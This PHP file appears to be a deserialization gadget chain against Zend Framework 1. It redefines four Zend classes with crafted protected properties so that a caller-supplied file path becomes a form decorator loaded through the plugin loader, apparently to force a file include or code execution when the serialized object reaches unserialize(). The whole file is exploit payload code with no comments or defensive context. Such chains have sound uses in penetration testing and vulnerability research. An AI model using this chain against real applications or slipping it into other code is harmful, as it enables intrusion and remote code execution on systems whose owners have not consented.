<?php

class Zend_Ldap_Node
{
    protected $_children;

    public function __construct($file) 
    {
        $this->_children = [new \Zend_Service_Twitter($file)];
    }

}

class Zend_Service_Twitter
{
    protected $oauthConsumer='Zend_Cache_Core';
    protected $methodType;

    public function __construct($file) 
    {
        $this->methodType = new \Zend_Form($file);
    }
}

class Zend_Form
{
    protected $_decorators;
    protected $_loaders;

    public function __construct($file) 
    {
        $this->_decorators = ['k'=>['decorator'=>$file,'options'=>'options']];
        $this->_loaders = ['DECORATOR'=>new \Zend_Loader_PluginLoader()];
    }
}

class Zend_Loader_PluginLoader
{
    protected $_loadedPlugins=[];
    protected $_prefixToPaths=[''=>['']];

    public function __construct() 
    {
    }
}